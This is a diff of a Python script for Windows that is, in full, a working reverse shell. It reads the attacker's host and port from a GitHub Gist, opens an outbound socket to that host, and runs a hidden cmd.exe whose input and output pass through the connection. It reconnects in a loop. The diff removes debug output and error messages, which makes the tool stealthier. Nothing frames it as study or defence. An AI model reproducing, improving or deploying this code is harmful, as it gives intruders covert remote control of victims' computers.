@@ -1,25 +1,23 @@
+import os
 import socket
 import subprocess
 import threading
 import time
-import os
 import json
-import sys
-import select
-from urllib.request import urlopen, Request # <--- NEW IMPORTS
-from urllib.error import URLError, HTTPError # <--- NEW IMPORTS
+from urllib.request import urlopen, Request
+from urllib.error import URLError, HTTPError
 
 # --- Configuration ---
-# GIST ID is static. The script uses this to find your dynamic URL.
+# Your Gist ID
 GIST_ID = "39fa66d009773b8324cc5845a9284930"
 API_URL = f"https://api.github.com/gists/{GIST_ID}"
-FILE_NAME = "reverse.txt" 
+FILE_NAME = "reverse.txt"
 RETRY_DELAY = 10 
 
-# --- Helper Functions (Data Transfer - Unchanged) ---
+# --- Exact Logic from Your Working Snippet ---
 
 def s2p(s, p):
-    """Transfer data from socket to process (stdin)."""
+    """Reads from Socket, writes to Process (stdin)"""
     while True:
         try:
             data = s.recv(1024)
@@ -27,57 +25,45 @@ def s2p(s, p):
                 p.stdin.write(data)
                 p.stdin.flush()
             else:
-                break
+                break # Remote closed connection
         except:
             break
 
 def p2s(s, p):
-    """Transfer data from process (stdout) to socket."""
-    # Reads efficiently using subprocess's stdout
+    """Reads from Process (stdout), sends to Socket"""
     while True:
         try:
+            # Using read(1) as requested - simple and reliable
             data = p.stdout.read(1)
             if data:
                 s.send(data)
             else:
-                break
+                break # Process ended
         except:
             break
 
-# --- Core Logic ---
+# --- Main Execution Loop ---
 
-def fetch_and_connect():
-    global url, port
-    print("\nStarting Windows Dynamic Reverse Shell...")
+def connect_and_run():
+    print("\nStarting Windows Dynamic Client...")
 
     while True:
-        
-        # 1. FETCH CONNECTION DETAILS (Using urllib.request)
+        # 1. FETCH CONNECTION DETAILS
         current_host = None
         current_port = None
         
         try:
-            print(f"[*] Fetching GIST metadata from API...")
-            
-            # Request 1: Get Gist Metadata from API (No requests library needed)
+            # Fetch Gist Metadata
             with urlopen(API_URL, timeout=10) as response:
-                api_data = response.read().decode('utf-8')
+                gist_data = json.loads(response.read().decode('utf-8'))
             
-            gist_data = json.loads(api_data)
             raw_url = gist_data['files'][FILE_NAME]['raw_url']
             
-            # 2. Fetch Content (HOST:PORT)
-            print(f"[*] Fetching connection details from discovered URL...")
+            # Fetch Content
             with urlopen(raw_url, timeout=10) as response:
-                raw_content = response.read().decode('utf-8')
-            
-            # --- DEBUG PRINT STATEMENT ---
-            print(f"[DEBUG] Raw content retrieved:\n---START---\n{raw_content.strip()}\n---END---")
-            # -----------------------------
-            
-            # 3. Parsing Logic (handles host: and port: labels)
-            lines = raw_content.splitlines()
-            
+                lines = response.read().decode('utf-8').splitlines()
+
+            # Parse Host/Port
             for line in lines:
                 if ":" not in line: continue
                 label, value = line.split(":", 1)
@@ -92,45 +78,51 @@ def fetch_and_connect():
                     current_port = int(value)
 
             if not current_host or not current_port:
-                print("[-] Parsing failed. Retrying...")
                 time.sleep(RETRY_DELAY)
                 continue
-                
-            print(f"[+] Target found: {current_host}:{current_port}")
 
-        # Handle exceptions specific to urllib (network/HTTP errors) and parsing
-        except (URLError, HTTPError, ValueError, IndexError, json.JSONDecodeError, KeyError) as e:
-            print(f"[-] Fetch error: {e}")
+        except Exception:
             time.sleep(RETRY_DELAY)
             continue
 
-        # 4. CONNECT AND RUN (Windows Subprocess)
+        # 2. CONNECT AND START SHELL
         s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((current_host, current_port))
-            
+
+            # Launch CMD.EXE (Windows version of "sh")
+            # We add CREATE_NO_WINDOW to ensure it stays hidden
             p = subprocess.Popen(
                 ["cmd.exe"], 
-                stdin=subprocess.PIPE, 
                 stdout=subprocess.PIPE, 
-                stderr=subprocess.STDOUT,
+                stderr=subprocess.STDOUT, 
+                stdin=subprocess.PIPE,
                 creationflags=subprocess.CREATE_NO_WINDOW
             )
 
-            # Threads
-            threading.Thread(target=s2p, args=[s, p], daemon=True).start()
-            threading.Thread(target=p2s, args=[s, p], daemon=True).start()
+            # Start the threads using your exact logic
+            s2p_thread = threading.Thread(target=s2p, args=[s, p])
+            s2p_thread.daemon = True
+            s2p_thread.start()
 
-            p.wait() # Block until shell closes
+            p2s_thread = threading.Thread(target=p2s, args=[s, p])
+            p2s_thread.daemon = True
+            p2s_thread.start()
 
-        except Exception as e:
-            print(f"[-] Connection failed: {e}")
+            # Wait for the shell to finish
+            p.wait()
+
+        except Exception:
+            pass # Connection failed or dropped
 
         finally:
-            if s: s.close()
-            print(f"[!] Reconnecting in {RETRY_DELAY}s...")
+            if s:
+                try:
+                    s.close()
+                except:
+                    pass
             time.sleep(RETRY_DELAY)
 
 if __name__ == "__main__":
-    fetch_and_connect()
+    connect_and_run()
